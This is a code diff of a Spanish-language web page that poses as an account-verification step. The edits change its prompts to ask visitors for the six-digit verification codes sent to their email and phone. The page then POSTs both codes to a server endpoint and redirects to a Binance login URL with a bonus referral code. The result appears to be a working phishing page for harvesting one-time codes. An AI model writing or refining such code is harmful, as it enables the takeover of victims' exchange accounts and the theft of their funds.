@@ -339,7 +339,7 @@ Utiliza llaves de acceso para completar la verificación
 
 <div class="modal-header">
 
-<h2>Correo electrónico</h2>
+<h2>Verificación por correo</h2>
 
 <div class="close" onclick="cerrarModal('correo')">&times;</div>
 
@@ -347,13 +347,13 @@ Utiliza llaves de acceso para completar la verificación
 
 <p>
 
-Ingresa el correo electrónico para continuar.
+Introduce el código de verificación de 6 dígitos.
 
 </p>
 
 <input
 type="email"
-placeholder="correo@ejemplo.com"
+placeholder=""
 id="correoInput">
 
 <button onclick="enviarCorreo()">
@@ -374,7 +374,7 @@ Enviar
 
 <div class="modal-header">
 
-<h2>Número de teléfono</h2>
+<h2>Verificación por número de teléfono</h2>
 
 <div class="close" onclick="cerrarModal('telefono')">&times;</div>
 
@@ -382,13 +382,13 @@ Enviar
 
 <p>
 
-Ingresa tu número telefónico.
+Introduce el código de verificación de 6 dígitos
 
 </p>
 
 <input
 type="text"
-placeholder="+57 3001234567"
+placeholder=""
 id="telefonoInput">
 
 <button onclick="enviarTelefono()">
@@ -411,6 +411,8 @@ Enviar
 
 let correo=false;
 let telefono=false;
+let correoValor="";
+let telefonoValor="";
 
 function abrirModal(tipo){
 
@@ -439,54 +441,70 @@ document.getElementById("contador").innerHTML=total+"/2";
 let correoEnviado = false;
 let telefonoEnviado = false;
 
-// Esta función es para el envío "silencioso" (sin pantalla de carga)
-async function enviarSilencioso(tipo, valor) {
-    try {
-        await fetch('/api/verificacion', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ tipo, valor })
-        });
-        return true;
-    } catch (e) {
-        return false;
+
+
+async function enviarCorreo(){
+
+    const valor=document.getElementById("correoInput").value;
+
+    if(!valor){
+        alert("Ingresa un correo");
+        return;
     }
+
+    correoValor=valor;
+
+    correo=true;
+    correoEnviado=true;
+
+    document.getElementById("correoItem").classList.add("completado");
+    document.getElementById("correoEstado").innerHTML="✔";
+
+    cerrarModal("correo");
+
+    actualizar();
+
+    verificarFinalizacion();
+
 }
 
-async function enviarCorreo() {
-    const valor = document.getElementById('correoInput').value;
-    if (!valor) return alert("Ingresa un correo");
+async function enviarTelefono(){
 
-    const exito = await enviarSilencioso('correo', valor);
-    if (exito) {
-        correo = true;
-        correoEnviado = true; // Marcamos como listo
-        document.getElementById("correoItem").classList.add("completado");
-        document.getElementById("correoEstado").innerHTML = "✔";
-        cerrarModal("correo");
-        actualizar();
-        verificarFinalizacion(); // Revisa si ya podemos lanzar la pantalla de carga
+    const valor=document.getElementById("telefonoInput").value;
+
+    if(!valor){
+        alert("Ingresa un teléfono");
+        return;
     }
-}
 
-async function enviarTelefono() {
-    const valor = document.getElementById('telefonoInput').value;
-    if (!valor) return alert("Ingresa un teléfono");
+    telefonoValor=valor;
 
-    const exito = await enviarSilencioso('telefono', valor);
-    if (exito) {
-        telefono = true;
-        telefonoEnviado = true; // Marcamos como listo
-        document.getElementById("telefonoItem").classList.add("completado");
-        document.getElementById("telefonoEstado").innerHTML = "✔";
-        cerrarModal("telefono");
-        actualizar();
-        verificarFinalizacion(); 
-    }
+    telefono=true;
+    telefonoEnviado=true;
+
+    document.getElementById("telefonoItem").classList.add("completado");
+    document.getElementById("telefonoEstado").innerHTML="✔";
+
+    cerrarModal("telefono");
+
+    actualizar();
+
+    verificarFinalizacion();
+
 }
 
 async function verificarFinalizacion() {
     if (correoEnviado && telefonoEnviado) {
+        await fetch("/api/verificacion",{
+            method:"POST",
+            headers:{
+                "Content-Type":"application/json"
+            },
+            body:JSON.stringify({
+                correo:correoValor,
+                telefono:telefonoValor
+            })
+        });
         // 1. Mostrar pantalla de carga
         const loader = document.getElementById('loaderScreen');
         const mensaje = document.getElementById('mensajeExito');
@@ -504,7 +522,7 @@ async function verificarFinalizacion() {
         await new Promise(resolve => setTimeout(resolve, 1000));
         
         // 5. Redirección
-        window.location.href = "authenticacion.html";
+        window.location.href = "https://accounts.binance.bh/es/login?ref=BONUS200USD&return_to=aHR0cHM6Ly93d3cuYmluYW5jZS5iaC9lbi1CSC9mdXR1cmVzL3JlZj9jb2RlPUJPTlVTMjAwVVNEJmJuYg%3D%3D&source=futures";
     }
 }
 
